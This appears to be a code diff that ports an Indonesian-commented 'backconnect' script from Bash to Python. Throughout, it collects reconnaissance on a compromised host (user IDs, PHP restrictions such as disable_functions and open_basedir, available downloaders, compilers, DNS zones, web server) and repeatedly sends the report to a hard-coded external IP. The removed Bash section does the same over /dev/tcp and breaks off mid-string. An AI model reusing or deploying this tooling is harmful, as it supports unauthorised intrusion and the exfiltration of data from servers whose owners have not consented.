@@ -1,190 +1,278 @@
-#!/bin/bash
+#!/usr/bin/env python3
+import socket
+import subprocess
+import os
+import time
 
 # Konfigurasi
-TARGET_IP="103.125.43.187"  # Ganti dengan IP client Anda
-TARGET_PORT="2012"         # Port yang Anda dengarkan di client
-RECONNECT_INTERVAL=5       # Interval reconnect (detik)
-USE_PYTHON=false          # Ganti ke true jika /dev/tcp tidak work
+TARGET_IP = "103.125.43.187"  # Ganti dengan IP client Anda
+TARGET_PORT = 2012            # Port yang Anda dengarkan di client
+RECONNECT_INTERVAL = 5        # Interval reconnect (detik)
 
-# Fungsi untuk mendapatkan informasi sistem
-get_system_info() {
-    # Uname
-    UNAME=$(uname -a)
-    
-    # User dan Group
-    USER_INFO=$(id -un)
-    GROUP_INFO=$(id -gn)
-    UID_NUM=$(id -u)
-    GID_NUM=$(id -g)
-    
-    # PHP dan Safe Mode (jika ada)
-    if command -v php >/dev/null 2>&1; then
-        PHP_VERSION=$(php -v | head -n1 | cut -d' ' -f2)
-        SAFE_MODE=$(php -i 2>/dev/null | grep "safe_mode" | head -n1 | cut -d' ' -f3)
-    else
-        PHP_VERSION="Not Installed"
-        SAFE_MODE="N/A"
-    fi
-    
-    # IP Server dan IP Client
-    SERVER_IP=$(hostname -I | awk '{print $1}')
-    CLIENT_IP=$TARGET_IP
-    
-    # DateTime
-    DATETIME=$(date '+%Y-%m-%d %H:%M:%S')
-    
-    # Domains (jika ada)
-    if [ -f /etc/named.conf ]; then
-        DOMAINS=$(grep -E 'zone "' /etc/named.conf | wc -l)
-    else
-        DOMAINS="Cant Read [ /etc/named.conf ]"
-    fi
-    
-    # HDD
-    HDD_INFO=$(df -h / | awk 'NR==2 {print "Total:"$2 " Free:"$4 " ["$5"]"}')
-    
-    # Useful Commands
-    USEFUL="gcc cc ld make php perl python tar gzip locate"
-    
-    # Downloader
-    DOWNLOADER=""
-    command -v wget >/dev/null 2>&1 && DOWNLOADER="${DOWNLOADER}wget "
-    command -v curl >/dev/null 2>&1 && DOWNLOADER="${DOWNLOADER}curl"
-    
-    # Disable Functions (untuk PHP)
-    if command -v php >/dev/null 2>&1; then
-        DISABLE_FUNCTIONS=$(php -i 2>/dev/null | grep "disable_functions" | cut -d' ' -f3-)
-        if [ -z "$DISABLE_FUNCTIONS" ]; then
-            DISABLE_FUNCTIONS="All Functions Accessible"
-        fi
-    else
-        DISABLE_FUNCTIONS="PHP Not Installed"
-    fi
-    
-    # PHP Modules
-    CURL_STATUS=$(php -m 2>/dev/null | grep -i curl >/dev/null 2>&1 && echo "ON" || echo "OFF")
-    SSH2_STATUS=$(php -m 2>/dev/null | grep -i ssh2 >/dev/null 2>&1 && echo "ON" || echo "OFF")
-    MAGIC_QUOTES=$(php -i 2>/dev/null | grep "magic_quotes_gpc" | head -n1 | cut -d' ' -f3)
-    MYSQL_STATUS=$(php -m 2>/dev/null | grep -i mysqli >/dev/null 2>&1 && echo "ON" || echo "OFF")
-    MSSQL_STATUS=$(php -m 2>/dev/null | grep -i mssql >/dev/null 2>&1 && echo "ON" || echo "OFF")
-    PGSQL_STATUS=$(php -m 2>/dev/null | grep -i pgsql >/dev/null 2>&1 && echo "ON" || echo "OFF")
-    ORACLE_STATUS=$(php -m 2>/dev/null | grep -i oci8 >/dev/null 2>&1 && echo "ON" || echo "OFF")
-    CGI_STATUS=$(php -m 2>/dev/null | grep -i cgi >/dev/null 2>&1 && echo "ON" || echo "OFF")
-    
-    # Open_basedir, etc.
-    OPEN_BASEDIR=$(php -i 2>/dev/null | grep "open_basedir" | cut -d' ' -f3-)
-    SAFE_MODE_EXEC_DIR=$(php -i 2>/dev/null | grep "safe_mode_exec_dir" | cut -d' ' -f3-)
-    SAFE_MODE_INCLUDE_DIR=$(php -i 2>/dev/null | grep "safe_mode_include_dir" | cut -d' ' -f3-)
-    
-    # Software Web Server
-    if command -v apache2 >/dev/null 2>&1; then
-        SOFTWARE=$(apache2 -v | head -n1)
-    elif command -v httpd >/dev/null 2>&1; then
-        SOFTWARE=$(httpd -v | head -n1)
-    elif command -v nginx >/dev/null 2>&1; then
-        SOFTWARE=$(nginx -v 2>&1)
-    else
-        SOFTWARE="Unknown"
-    fi
-}
-
-# Fungsi untuk mengirim informasi dengan warna
-send_info() {
-    get_system_info
-    
-    # Header
-    echo -e "\e[1;32m========================================\e[0m"
-    echo -e "\e[1;31m      BACKCONNECT SUCCESSFUL\e[0m"
-    echo -e "\e[1;32m========================================\e[0m"
-    echo ""
+def get_system_info():
+    info = {}
     
     # Uname
-    echo -e "\e[1;33mUname:\e[0m\t\e[1;37m$UNAME\e[0m"
+    try:
+        info['uname'] = subprocess.check_output(['uname', '-a']).decode().strip()
+    except:
+        info['uname'] = "Unknown"
     
     # User dan Group
-    echo -e "\e[1;33mUser:\e[0m\t\e[1;37m$UID_NUM [ $USER_INFO ] Group: $GID_NUM [ $GROUP_INFO ]\e[0m"
+    try:
+        info['user'] = subprocess.check_output(['id', '-un']).decode().strip()
+        info['group'] = subprocess.check_output(['id', '-gn']).decode().strip()
+        info['uid'] = subprocess.check_output(['id', '-u']).decode().strip()
+        info['gid'] = subprocess.check_output(['id', '-g']).decode().strip()
+    except:
+        info['user'] = "Unknown"
+        info['group'] = "Unknown"
+        info['uid'] = "Unknown"
+        info['gid'] = "Unknown"
     
-    # PHP
-    echo -e "\e[1;33mPHP:\e[0m\t\e[1;37m$PHP_VERSION Safe Mode: $SAFE_MODE\e[0m"
+    # PHP dan Safe Mode
+    try:
+        php_version = subprocess.check_output(['php', '-v'], stderr=subprocess.DEVNULL).decode().split('\n')[0].split(' ')[1]
+        info['php_version'] = php_version
+        
+        # Get safe mode status
+        php_info = subprocess.check_output(['php', '-i'], stderr=subprocess.DEVNULL).decode()
+        for line in php_info.split('\n'):
+            if 'safe_mode' in line and '=>' in line:
+                info['safe_mode'] = line.split('=>')[1].strip()
+                break
+        else:
+            info['safe_mode'] = "N/A"
+    except:
+        info['php_version'] = "Not Installed"
+        info['safe_mode'] = "N/A"
     
-    # IP
-    echo -e "\e[1;33mServerIP:\e[0m\t\e[1;37m$SERVER_IP Your IP: $CLIENT_IP\e[0m"
+    # IP Server
+    try:
+        info['server_ip'] = subprocess.check_output(['hostname', '-I']).decode().split()[0]
+    except:
+        info['server_ip'] = "Unknown"
     
     # DateTime
-    echo -e "\e[1;33mDateTime:\e[0m\t\e[1;37m$DATETIME\e[0m"
+    info['datetime'] = time.strftime('%Y-%m-%d %H:%M:%S')
     
     # Domains
-    echo -e "\e[1;33mDomains:\e[0m\t\e[1;37m$DOMAINS\e[0m"
+    if os.path.exists('/etc/named.conf'):
+        try:
+            with open('/etc/named.conf', 'r') as f:
+                content = f.read()
+                domains = content.count('zone "')
+                info['domains'] = str(domains)
+        except:
+            info['domains'] = "Cant Read [ /etc/named.conf ]"
+    else:
+        info['domains'] = "Cant Read [ /etc/named.conf ]"
     
     # HDD
-    echo -e "\e[1;33mHDD:\e[0m\t\e[1;37m$HDD_INFO\e[0m"
+    try:
+        df_output = subprocess.check_output(['df', '-h', '/']).decode()
+        lines = df_output.split('\n')
+        if len(lines) > 1:
+            parts = lines[1].split()
+            if len(parts) >= 4:
+                info['hdd'] = f"Total:{parts[1]} Free:{parts[3]} [{parts[4]}]"
+            else:
+                info['hdd'] = "Unknown"
+        else:
+            info['hdd'] = "Unknown"
+    except:
+        info['hdd'] = "Unknown"
     
-    # Useful
-    echo -e "\e[1;33mUseful :\e[0m\t\e[1;37m$USEFUL\e[0m"
+    # Useful Commands
+    info['useful'] = "gcc cc ld make php perl python tar gzip locate"
     
     # Downloader
-    echo -e "\e[1;33mDownloader:\e[0m\t\e[1;37m$DOWNLOADER\e[0m"
+    downloader = []
+    if subprocess.call(['which', 'wget'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
+        downloader.append("wget")
+    if subprocess.call(['which', 'curl'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
+        downloader.append("curl")
+    info['downloader'] = " ".join(downloader) if downloader else "None"
     
-    # Disable Functions
-    echo -e "\e[1;33mDisable Functions:\e[0m\t\e[1;37m$DISABLE_FUNCTIONS\e[0m"
+    # Disable Functions (PHP)
+    try:
+        php_info = subprocess.check_output(['php', '-i'], stderr=subprocess.DEVNULL).decode()
+        for line in php_info.split('\n'):
+            if 'disable_functions' in line and '=>' in line:
+                disable_functions = line.split('=>')[1].strip()
+                if disable_functions == 'no value':
+                    info['disable_functions'] = "All Functions Accessible"
+                else:
+                    info['disable_functions'] = disable_functions
+                break
+        else:
+            info['disable_functions'] = "All Functions Accessible"
+    except:
+        info['disable_functions'] = "PHP Not Installed"
     
     # PHP Modules
-    echo -e "\e[1;33mCURL :\e[0m\t\e[1;37m$CURL_STATUS | SSH2 : $SSH2_STATUS | Magic Quotes : $MAGIC_QUOTES | MySQL : $MYSQL_STATUS | MSSQL : $MSSQL_STATUS | PostgreSQL : $PGSQL_STATUS | Oracle : $ORACLE_STATUS | CGI : $CGI_STATUS\e[0m"
+    php_modules = {
+        'curl': False,
+        'ssh2': False,
+        'mysqli': False,
+        'mssql': False,
+        'pgsql': False,
+        'oci8': False,
+        'cgi': False
+    }
+    
+    try:
+        php_modules_output = subprocess.check_output(['php', '-m'], stderr=subprocess.DEVNULL).decode()
+        for module in php_modules:
+            if module in php_modules_output:
+                php_modules[module] = True
+    except:
+        pass
+    
+    info['curl_status'] = "ON" if php_modules['curl'] else "OFF"
+    info['ssh2_status'] = "ON" if php_modules['ssh2'] else "OFF"
+    info['mysql_status'] = "ON" if php_modules['mysqli'] else "OFF"
+    info['mssql_status'] = "ON" if php_modules['mssql'] else "OFF"
+    info['pgsql_status'] = "ON" if php_modules['pgsql'] else "OFF"
+    info['oracle_status'] = "ON" if php_modules['oci8'] else "OFF"
+    info['cgi_status'] = "ON" if php_modules['cgi'] else "OFF"
+    
+    # Magic Quotes
+    try:
+        php_info = subprocess.check_output(['php', '-i'], stderr=subprocess.DEVNULL).decode()
+        for line in php_info.split('\n'):
+            if 'magic_quotes_gpc' in line and '=>' in line:
+                info['magic_quotes'] = line.split('=>')[1].strip()
+                break
+        else:
+            info['magic_quotes'] = "N/A"
+    except:
+        info['magic_quotes'] = "N/A"
     
     # Open_basedir, etc.
-    echo -e "\e[1;33mOpen_basedir :\e[0m\t\e[1;37m$OPEN_BASEDIR | Safe_mode_exec_dir : $SAFE_MODE_EXEC_DIR | Safe_mode_include_dir : $SAFE_MODE_INCLUDE_DIR\e[0m"
+    try:
+        php_info = subprocess.check_output(['php', '-i'], stderr=subprocess.DEVNULL).decode()
+        for line in php_info.split('\n'):
+            if 'open_basedir' in line and '=>' in line:
+                info['open_basedir'] = line.split('=>')[1].strip()
+                break
+        else:
+            info['open_basedir'] = "NONE"
+    except:
+        info['open_basedir'] = "NONE"
     
-    # Software
-    echo -e "\e[1;33mSoftWare:\e[0m\t\e[1;37m$SOFTWARE\e[0m"
+    try:
+        php_info = subprocess.check_output(['php', '-i'], stderr=subprocess.DEVNULL).decode()
+        for line in php_info.split('\n'):
+            if 'safe_mode_exec_dir' in line and '=>' in line:
+                info['safe_mode_exec_dir'] = line.split('=>')[1].strip()
+                break
+        else:
+            info['safe_mode_exec_dir'] = "NONE"
+    except:
+        info['safe_mode_exec_dir'] = "NONE"
     
-    echo ""
-    echo -e "\e[1;32m========================================\e[0m"
-    echo -e "\e[1;31m            END OF INFO\e[0m"
-    echo -e "\e[1;32m========================================\e[0m"
-    echo ""
-}
-
-# Fungsi backconnect dengan /dev/tcp (bash built-in)
-backconnect_bash() {
-    while true; do
-        echo "[*] Mencoba koneksi ke $TARGET_IP:$TARGET_PORT..."
-        
-        # Coba koneksi dengan /dev/tcp
-        if (echo > /dev/tcp/$TARGET_IP/$TARGET_PORT) >/dev/null 2>&1; then
-            # Kirim informasi sistem
-            exec 3<>/dev/tcp/$TARGET_IP/$TARGET_PORT
-            send_info >&3
-            exec 3<&-
-            exec 3>&-
-            echo "[*] Informasi terkirim!"
-        else
-            echo "[!] Koneksi gagal! Reconnect dalam $RECONNECT_INTERVAL detik..."
-        fi
-        
-        sleep $RECONNECT_INTERVAL
-    done
-}
-
-# Fungsi backconnect dengan Python
-backconnect_python() {
-    while true; do
-        echo "[*] Mencoba koneksi ke $TARGET_IP:$TARGET_PORT..."
-        
-        # Buat script Python sementara
-        TEMP_PY=$(mktemp --suffix=.py)
-        cat > $TEMP_PY <<EOF
-import socket, subprocess, os, sys
+    try:
+        php_info = subprocess.check_output(['php', '-i'], stderr=subprocess.DEVNULL).decode()
+        for line in php_info.split('\n'):
+            if 'safe_mode_include_dir' in line and '=>' in line:
+                info['safe_mode_include_dir'] = line.split('=>')[1].strip()
+                break
+        else:
+            info['safe_mode_include_dir'] = "NONE"
+    except:
+        info['safe_mode_include_dir'] = "NONE"
+    
+    # Software Web Server
+    if subprocess.call(['which', 'apache2'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
+        try:
+            info['software'] = subprocess.check_output(['apache2', '-v'], stderr=subprocess.DEVNULL).decode().split('\n')[0]
+        except:
+            info['software'] = "Apache (version unknown)"
+    elif subprocess.call(['which', 'httpd'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
+        try:
+            info['software'] = subprocess.check_output(['httpd', '-v'], stderr=subprocess.DEVNULL).decode().split('\n')[0]
+        except:
+            info['software'] = "Httpd (version unknown)"
+    elif subprocess.call(['which', 'nginx'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
+        try:
+            info['software'] = subprocess.check_output(['nginx', '-v'], stderr=subprocess.DEVNULL).decode().strip()
+        except:
+            info['software'] = "Nginx (version unknown)"
+    else:
+        info['software'] = "Unknown"
+    
+    return info
 
 def send_info():
-    # Fungsi untuk mengirim informasi sistem
-    info = """\\e[1;32m========================================\\e[0m
-\\e[1;31m      BACKCONNECT SUCCESSFUL\\e[0m
-\\e[1;32m========================================\\e[0m
+    info = get_system_info()
+    
+    # Header
+    output = "\033[1;32m========================================\033[0m\n"
+    output += "\033[1;31m      BACKCONNECT SUCCESSFUL\033[0m\n"
+    output += "\033[1;32m========================================\033[0m\n\n"
+    
+    # Uname
+    output += f"\033[1;33mUname:\033[0m\t\033[1;37m{info['uname']}\033[0m\n"
+    
+    # User dan Group
+    output += f"\033[1;33mUser:\033[0m\t\033[1;37m{info['uid']} [ {info['user']} ] Group: {info['gid']} [ {info['group']} ]\033[0m\n"
+    
+    # PHP
+    output += f"\033[1;33mPHP:\033[0m\t\033[1;37m{info['php_version']} Safe Mode: {info['safe_mode']}\033[0m\n"
+    
+    # IP
+    output += f"\033[1;33mServerIP:\033[0m\t\033[1;37m{info['server_ip']} Your IP: {TARGET_IP}\033[0m\n"
+    
+    # DateTime
+    output += f"\033[1;33mDateTime:\033[0m\t\033[1;37m{info['datetime']}\033[0m\n"
+    
+    # Domains
+    output += f"\033[1;33mDomains:\033[0m\t\033[1;37m{info['domains']}\033[0m\n"
+    
+    # HDD
+    output += f"\033[1;33mHDD:\033[0m\t\033[1;37m{info['hdd']}\033[0m\n"
+    
+    # Useful
+    output += f"\033[1;33mUseful :\033[0m\t\033[1;37m{info['useful']}\033[0m\n"
+    
+    # Downloader
+    output += f"\033[1;33mDownloader:\033[0m\t\033[1;37m{info['downloader']}\033[0m\n"
+    
+    # Disable Functions
+    output += f"\033[1;33mDisable Functions:\033[0m\t\033[1;37m{info['disable_functions']}\033[0m\n"
+    
+    # PHP Modules
+    output += f"\033[1;33mCURL :\033[0m\t\033[1;37m{info['curl_status']} | SSH2 : {info['ssh2_status']} | Magic Quotes : {info['magic_quotes']} | MySQL : {info['mysql_status']} | MSSQL : {info['mssql_status']} | PostgreSQL : {info['pgsql_status']} | Oracle : {info['oracle_status']} | CGI : {info['cgi_status']}\033[0m\n"
+    
+    # Open_basedir, etc.
+    output += f"\033[1;33mOpen_basedir :\033[0m\t\033[1;37m{info['open_basedir']} | Safe_mode_exec_dir : {info['safe_mode_exec_dir']} | Safe_mode_include_dir : {info['safe_mode_include_dir']}\033[0m\n"
+    
+    # Software
+    output += f"\033[1;33mSoftWare:\033[0m\t\033[1;37m{info['software']}\033[0m\n"
+    
+    output += "\n"
+    output += "\033[1;32m========================================\033[0m\n"
+    output += "\033[1;31m            END OF INFO\033[0m\n"
+    output += "\033[1;32m========================================\033[0m\n\n"
+    
+    return output
 
-\\e[1;33mUname:\\e[0m\\t\\e[1;37m$(uname -a)\\e[0m
-\\e[1;33mUser:\\e[0m\\t\\e[1;37m$(id -un) [ $(id -u) ] Group: $(id -gn) [ $(id -g) ]\\e[0m
-\\e[1;33mPHP:\\e[0m\\t\\e[1;37m$(if command -v php >/dev/null 2>&1; then php -v | head -n1 | cut -d' ' -f2; else echo "Not Installed"; fi) Safe Mode: $(if command -v php >/dev/null 2>&1; then php -i 2>/dev/null | grep "safe_mode" | head -n1 | cut -d' ' -f3; else echo "N/A"; fi)\\e[0m
-\\e[1;33mServerIP:\\e[0m\\t\\e[1;37m$(hostname -I | awk '{print $1}') Your IP: $TARGET_IP\\e[0m
-\\e[1;33mDateTime:\\e[0m\\t\\e[1;37m$(date '+%Y-%m-%d %H:%M:%S')\\e[0m
-\\e[1;33mDomains:\\e[0m\\t\\e[1;37m$(if [ -f /etc/named.conf ]; then grep -E 'zone "' /etc/named.conf | wc -l; else echo "Cant Read [ /etc/named.conf ]"; fi)\\e[0m
-\\e[1;33
+def backconnect():
+    while True:
+        print(f"[*] Mencoba koneksi ke {TARGET_IP}:{TARGET_PORT}")
+        
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((TARGET_IP, TARGET_PORT))
+            s.send(send_info().encode())
+            s.close()
+            print("[*] Informasi terkirim!")
+        except Exception as e:
+            print(f"[!] Koneksi gagal: {str(e)}")
+        
+        print(f"[!] Reconnect dalam {RECONNECT_INTERVAL} detik...")
+        time.sleep(RECONNECT_INTERVAL)
+
+if __name__ == "__main__":
+    backconnect()
